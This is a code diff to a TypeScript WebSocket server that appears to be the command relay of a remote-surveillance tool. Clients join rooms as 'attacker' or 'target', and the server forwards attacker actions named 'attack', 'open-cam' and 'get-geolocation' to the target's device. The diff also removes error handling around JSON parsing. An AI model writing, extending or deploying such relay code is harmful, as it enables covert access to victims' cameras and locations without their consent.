@@ -30,17 +30,15 @@ const websocket = new WebSocketServer({ server });
 app.use(cors());
 app.use(helmet());
 app.use(morgan("dev"));
+app.use(
+  express.json({
+    limit: "2mb",
+  })
+);
 
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
-type MessageType = "target" | "attacker";
-interface Message {
-  type: MessageType;
-  device_id: string;
-  content: string;
-}
 
 // Ketika ada koneksi WebSocket baru
 const attackers = new Map<string, WebSocket>(); // room_id
@@ -65,19 +63,23 @@ websocket.on("connection", (ws: WebSocket) => {
   const path = ws.url;
   console.log(`Client ${id} connected to ${path}`);
 
-  ws.on("join_attacker", () => {
+  // Handle join_attacker and join_target through message events
+  const handleJoinAttacker = () => {
     attackers.set(id, ws);
     rooms.set(path, {
       attacker_id: id,
     });
-  });
-  ws.on("join_target", () => {
+    console.log(`Attacker ${id} joined room ${path}`);
+  };
+
+  const handleJoinTarget = () => {
     targets.set(id, ws);
     const room = rooms.get(path);
     if (room) {
       room.target_id = id;
     }
-  });
+    console.log(`Target ${id} joined room ${path}`);
+  };
   ws.on("close", () => {
     console.log("Client disconnected");
     const is_attacker = attackers.get(id);
@@ -95,33 +97,70 @@ websocket.on("connection", (ws: WebSocket) => {
     }
   });
 
-  ws.on("message", (data) => {
-    const str = data.toString();
+  type DataEvent = "join" | "action" | "message";
+  type DataJoinAt = "attacker" | "target";
+  interface Action {
+    type: "attack" | "open-cam" | "get-geolocation";
+  }
+  type MessageType = "target" | "attacker";
+  interface Message {
+    type: MessageType;
+    device_id: string;
+    content: string;
+  }
+  interface Data {
+    event: DataEvent;
+    join_at?: DataJoinAt;
+    action?: Action; // only attacker side
+    message?: Message;
+  }
+  ws.on("message", (res) => {
+    const str = res.toString();
     console.log("Received:", str);
+    const data = JSON.parse(str) as Data;
 
-    let msg: Message;
-    try {
-      msg = JSON.parse(str);
-    } catch (err) {
-      console.error("Invalid JSON:", err);
+    // Handle simple string commands
+    if (data.event === "join") {
+      if (data.join_at === "attacker") {
+        handleJoinAttacker();
+      } else if (data.join_at === "target") {
+        handleJoinTarget();
+      }
       return;
     }
 
-    // Broadcast ke semua client yang masih terbuka
-    // websocket.clients.forEach((client) => {
-    //   if (client.readyState === WebSocket.OPEN) {
-    //     client.send(JSON.stringify(msg));
-    //   }
-    // });
+    // Handle JSON messages
+    if (data.event === "message" && data.message) {
+      const msg = data.message;
+      console.log("Processed message:", msg);
+
+      // Forward message to appropriate recipients
+      // You can add logic here to forward messages between attacker and target
+    }
+
+    // Handle action events
+    if (data.event === "action" && data.action) {
+      const action = data.action;
+      console.log("Processed action:", action);
+
+      // Forward action to target if connected
+      const room = rooms.get(path);
+      if (room && room.target_id) {
+        const targetWs = targets.get(room.target_id);
+        if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+          targetWs.send(JSON.stringify(data));
+          console.log(`Action forwarded to target ${room.target_id}`);
+        }
+      }
+    }
   });
 
   // Optional: kirim pesan saat connect
-  const welcome: Message = {
-    type: "attacker",
-    device_id: "abc123",
-    content: "Welcome!",
-  };
-  ws.send(JSON.stringify(welcome));
+  ws.send(
+    JSON.stringify({
+      device_id: id,
+    })
+  );
 });
 
 app.post("/api/config/set/:room_id", (req, res) => {
